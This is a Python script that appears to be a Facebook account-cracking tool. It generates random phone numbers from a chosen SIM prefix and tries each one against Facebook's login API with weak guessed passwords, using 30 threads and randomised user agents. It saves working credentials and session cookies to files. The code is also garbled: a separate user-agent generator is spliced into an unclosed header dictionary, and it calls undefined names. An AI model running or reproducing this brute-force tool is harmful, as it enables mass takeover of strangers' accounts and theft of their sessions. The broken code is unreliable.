#WRITTEN BY MR.DIPTO
#FOLLOW : https://github.com/MR-DIPTO-404
#------------- import -------------#
import os
from os import system as clr
import random
import string 
from concurrent.futures import ThreadPoolExecutor as tred
import requests
import re
import sys
import uuid
import json
#-------------color----------------#
bblack="\033[1;30m"         # Black
M="\033[1;31m"            # Red
H="\033[1;32m"         # Green
byellow="\033[1;33m"        # Yellow
bblue="\033[1;34m"          # Blue
P="\033[1;35m"        # Purple
C="\033[1;36m"          # Cyan
B="\033[1;37m"         # White
my_color = [
 B,C,P,H]
warna = random.choice(my_color)
oks=[]
cps=[]
loop=0
#-------------logo-----------------#
logo=(f'''{B}
`7MM"""Mq. `7MMF' `7MN.   `7MF'  .g8"""bgd
{warna}  MM   `MM.  MM     MMN.    M  .dP'     `M
{B}  MM   ,M9   MM     M YMb   M  dM'       `
{warna}  MMmmdM9    MM     M  `MN. M  MM
 {B} MM         MM     M   `MM.M  MM.    `7MMF'
{warna}  MM         MM     M     YMM  `Mb.     MM
{B}.JMML.     .JMML. .JML.    YM    `"bmmmdPY
{warna}--------------------------------------------{B}
 Owner    : {C}MR.DIPTO{B}
 Guthub   : MR-DIPTO-404
 Facebook : ADRIAN DIPTO
 Tools    : F{C}/{B}R{C}/{B}G{M} •{warna}[{H}TRAIL{warna}]{warna}
--------------------------------------------{B}''')
#-------------linex def -------------#
def linex():
    print(f'{warna}--------------------------------------------{B}')
#-------------clear def -------------#
def clear():
    clr('clear')
    print(logo)
#-------------main def------------#
def MR_DIPTO():
    clear()
    os.system('xdg-open https://github.com/MR-DIPTO-404')
    print(f'{B} [{warna}01{B}] RANDOM CLONING ')
    print(f'{B} [{warna}00{B}] EXIT TERMINAL ')
    linex()
    option=input(f' {B}[{warna}??{B}] CHOICE MENU >> ')
    if option in ['01','1']:
        BD_CLONING()
    else:
        exit(' Thanks for using dear :)')
#------------- bd clone def ----------#
def BD_CLONING():
    user=[]
    clear()
    print(' EXAMPLE SIM CODE : [016] [017] [018] [019]')
    code=input(' ENTER SIM CODE >> ')
    linex()
    print(' EXAMPLE LIMIT : [1000] [2000] [5000] [10000]')
    try:
        limit=int(input(' ENTER LIMIT >> '))
    except ValueError:
        limit=50000
    clear()
    for nmbr in range(limit):
        nmp=''.join(random.choice(string.digits) for _ in range(8))
        user.append(nmp)
    with tred(max_workers=30) as Dipto:
        tl=str(len(user))
        print(' TOTAL ACCOUNT : '+tl)
        print(' YOUR SIM CODE : '+code)
        print(' PROGRESS HAS BEEN RUNNING PLEASE WAIT ')
        linex()
        for psx in user:
            ids=code+psx
            passlist=[psx,ids,ids[:7],ids[:6],ids[5:],ids[4:],'sadiya','jannat','hridoy','mababa','fatema']
            Dipto.submit(method_crack,ids,passlist)
    linex()
    print(' THE PROGRESS HAS BEEN COMPLETE ')
    print(' TOTAL OK ID '+str(len(oks)))
    print(' TOTAL CP ID '+str(len(cps)))
    input(' PRESS ENTER TO BACK  : ')
    MR_DIPTO()
#------------ method crack def ---------#
def method_crack(ids,passlist):
    global oks
    global cps
    global loop
    try:
        for pas in passlist:
            sys.stdout.write('\r\r \033[1;37m[Progress] %s|\033[1;32mSucces:%s'%(loop,len(oks)))
            sys.stdout.flush()
            adid=str(uuid.uuid4())
            device_id=str(uuid.uuid4())
            datax={'adid': adid, 'format': 'json', 'device_id': device_id, 'email': ids, 'password': pas, 'generate_analytics_claims': '1', 'credentials_type': 'password', 'source': 'login', 'error_detail_type': 'button_with_disabled', 'enroll_misauth': 'false', 'generate_session_cookies': '1', 'generate_machine_id': '1', 'meta_inf_fbmeta': '', 'currently_logged_in_userid': '0', 'fb_api_req_friendly_name': 'authenticate'}
            header={'User-Agent': '["Dalvik/2.1.0"]
android_version = ["Android 10", "Android 11", "Android 12"]
device_make = ["Samsung", "Nokia", "Google Pixel", "OnePlus"]
app_version = ["FBAV/409.0.0.27.106", "FBAV/410.0.0.28.107", "FBAV/411.0.0.29.108"]
locale = ["en_US", "en_UK", "fr_FR", "es_ES"]
screen_resolution = ["1080x1920", "720x1280", "1440x2560"]
facebook_build = ["FB4A", "FB4B", "FB4C"]
processor_architecture = ["armeabi-v7a", "arm64-v8a", "x86"]
facebook_fw_version = ["FB_FW/1", "FB_FW/2"]
random_density = random.uniform(1.0, 3.0)  # Generate a random density value
random_width = random.randint(320, 1440)   # Generate a random width value
random_height = random.randint(480, 2560)  # Generate a random height value

# Randomly select values for each part of the user agent
user_agent = f"{random.choice(dalvik_version)} (Linux; U; {random.choice(android_version)}; {random.choice(device_make)} Build/{random.randint(1, 999999)}.001) " \
             f"[FBAN/{random.choice(facebook_build)};{random.choice(app_version)};FBPN/com.facebook.katana;FBLC/{random.choice(locale)};" \
             f"FBBV/{random.randint(1, 999999)};FBCR/{random.choice(['AT&T', 'Verizon', 'T-Mobile'])};FBMF/{random.choice(device_make)};FBBD/{random.choice(device_make)};" \
             f"FBDV/{random.choice(['Nokia0', 'Nokia1', 'Nokia2'])};FBSV/11;FBCA/{random.choice(processor_architecture)};FBDM/{{density={random_density:.2f},width={random_width},height={random_height}}};{random.choice(facebook_fw_version)};FBRV/{random.randint(1, 999999)}}]"
            url='https://api.facebook.com/method/auth.login'
            reqx=requests.post(url,data=datax,headers=header).json()
            if 'session_key' in reqx:
                try:
                    uid=reqx['uid']
                except:
                    uid=ids
                    ckkx=lock_check(uid)
                if ckkx=='LOCK':
                    break
                    #Lock show hobey na
                else:
                    print('\r\r \033[1;32m[PING-OK] '+str(uid)+' | '+pas+'\033[1;37m')
                    coki=";".join(i["name"]+"="+i["value"] for i in reqx["session_cookies"])
                    print('\033[1;32m [COOKIES] '+coki)
                    open('/sdcard/PING-OK.txt','a').write(str(uid)+' | '+pas+'\n')
                    oks.append(str(uid))
                    break
                    #Ok id show hobey
            elif 'www.facebook.com' in reqx['error_msg']:
                print('\r\r \033[1;30m[PING-CP] '+ids+' | '+pas+'\033[1;37m')
                open('/sdcard/PING-CP.txt','a').write(ids+'|'+pas+'\n')
                cps.append(ids)
                break
            else:
                continue
        loop+=1
    except:
        pass
        
 #-------checker------#
def lock_check(uid):
    sessionx=requests.Session()
    urlx=f'https://www.facebook.com/p/{uid}'
    req=bxx(sessionx.get(urlx).content,'html.parser')
    tx=req.find('title').text
    if tx =='Facebook':
        return('LOCK')
    else:
        return('LIVE')
        
#-------------end----------------#
MR_DIPTO()